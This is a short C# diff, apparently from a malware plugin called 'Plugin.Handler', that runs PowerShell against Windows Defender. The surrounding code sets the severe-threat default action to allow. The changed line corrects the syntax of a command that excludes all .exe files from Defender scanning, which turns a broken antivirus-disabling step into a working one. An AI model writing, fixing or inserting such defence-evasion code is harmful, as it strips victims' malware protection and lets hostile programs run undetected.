@@ -106,7 +106,7 @@ namespace Plugin.Handler
                 else if (line.Contains(@"SevereThreatDefaultAction") && !line.Contains("6"))
                     RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
             }
-            RunPS("Add - MpPreference - ExclusionExtension "+"\""+".exe"+"\""); // add exe to exception
+            RunPS("Add-MpPreference -ExclusionExtension "+"\""+".exe"+"\""); // add exe to exception
         }
 
         private void RunPS(string args)
